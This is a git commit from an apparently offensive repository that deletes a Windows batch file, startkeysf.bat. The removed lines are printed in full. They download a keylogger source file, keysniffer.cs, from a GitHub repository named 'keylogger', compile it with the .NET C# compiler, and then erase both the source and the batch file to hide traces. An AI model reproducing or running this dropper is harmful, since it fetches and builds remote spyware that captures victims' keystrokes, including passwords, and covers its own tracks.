2ac38d05210cc93e4b3ee4ee8be0613ac7abbfe2
AnonUser <127699732+w3irdguy@users.noreply.github.com>
2024-09-07 17:47:30 -0300

    Delete startkeysf.bat

--- startkeysf.bat
+++
@@ -1,4 +0,0 @@
-@echo off
-curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/keysniffer.cs
-C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe keysniffer.cs
-erase keysniffer.cs & erase startkeysf.bat 
